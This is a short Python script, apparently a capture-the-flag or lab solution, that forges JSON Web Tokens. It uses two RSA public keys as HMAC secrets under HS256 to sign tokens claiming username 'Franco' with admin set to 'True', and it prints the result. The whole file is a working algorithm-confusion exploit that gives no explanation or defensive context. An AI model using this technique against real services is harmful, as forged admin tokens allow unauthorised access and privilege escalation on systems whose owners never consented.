import json
import jwt

PUBLIC_KEY = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAvoOtsfF5Gtkr2Swy0xzuUp5J3w8bJY5oF7TgDrkAhg1sFUEaCMlR\nYltE8jobFTyPo5cciBHD7huZVHLtRqdhkmPD4FSlKaaX2DfzqyiZaPhZZT62w7Hi\ngJlwG7M0xTUljQ6WBiIFW9By3amqYxyR2rOq8Y68ewN000VSFXy7FZjQ/CDA3wSl\nQ4KI40YEHBNeCl6QWXWxBb8AvHo4lkJ5zZyNje+uxq8St1WlZ8/5v55eavshcfD1\n0NSHaYIIilh9yic/xK4t20qvyZKe6Gpdw6vTyefw4+Hhp1gROwOrIa0X0alVepg9\nJddv6V/d/qjDRzpJIop9DSB8qcF1X23pkQIDAQAB\n-----END RSA PUBLIC KEY-----\n"
encoded = jwt.encode({ "username":"Franco", "admin":"True"},PUBLIC_KEY,algorithm="HS256")

PUBLIC_KEY2 = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEA7pgbuP6X8XHyFr47ybSr1yT+m++FNn/fUnnKP113bYbcp/Jn4nl5\nkiRoK4cgXWv6yYaTxVMSyvLcdDkPsmZ0J4DfBXZSpUKY2QK+oR76nb5fZ+VNUEi0\nIu15GBJdIPj8yEA81OviDNcnXRyDpLBWtXZ1gNJyvoiOj/3DgRcIWz9yJNkze8ln\nutMOzxobg/o2i9oewa2MJk+MHKUZOOCxoaVfmdczTqDIXdowxnWCTEgWb4SBN+MH\nGu+8pWgGqXCioGDPALHRR98CWopHC0z7Via/UXkLNGCjJfdNZiJFnLHG8tATDvDS\nCDQSg46MARk5Ein4ekVPaNKnjc6INnO01QIDAQAB\n-----END RSA PUBLIC KEY-----\n"
encoded2 = jwt.encode({ "username":"Franco", "admin":"True"},PUBLIC_KEY2,algorithm="HS256")

print(f"{str(encoded2)}")